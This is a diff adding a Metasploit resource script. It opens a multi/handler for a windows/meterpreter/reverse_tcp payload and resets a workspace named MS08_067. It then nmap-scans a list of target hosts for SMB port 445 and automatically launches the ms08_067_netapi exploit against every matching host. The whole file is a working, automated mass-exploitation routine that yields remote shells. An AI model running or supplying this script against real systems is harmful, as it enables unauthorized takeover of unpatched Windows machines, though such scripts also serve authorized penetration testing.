@@ -1,0 +1,39 @@
+use multi/handler
+setg PAYLOAD windows/meterpreter/reverse_tcp
+set ExitOnSession false
+
+<ruby>
+workspace_name = "MS08_067"
+print_status("Creating Workspace #{workspace_name}")
+print_status("If a workspace with this name allready exists it will be deleted")
+workspace = framework.db.find_workspace(workspace_name)
+
+if workspace != nil
+        workspace.destroy
+        workspace = framework.db.add_workspace(workspace_name)
+        print_status("Create Workspace #{workspace_name}")
+else
+        workspace = framework.db.add_workspace(workspace_name)
+end
+
+
+run_single("workspace #{workspace_name}")
+#run_single("db_nmap -sV -O -p 445 --script=smb-check-vulns #{framework.datastore['RHOSTS']}")
+run_single("db_nmap -sV -O -p 445 --script=smb-check-vulns -T4 -Pn -iL today.txt")
+run_single("use exploit/windows/smb/ms08_067_netapi")
+
+framework.db.services.each do |db_services|
+	if (db_services.port == 445) && (db_services.name == "microsoft-ds")
+		framework.db.hosts.each do |ip|
+			if ip.id == db_services.host.id
+                                run_single("set RHOST #{ip.address}")
+                                print_status("Attacking Host #{ip.address} with MS08_067")
+				run_single("exploit -z")
+                        end
+                end
+        end
+end
+
+
+</ruby>
+
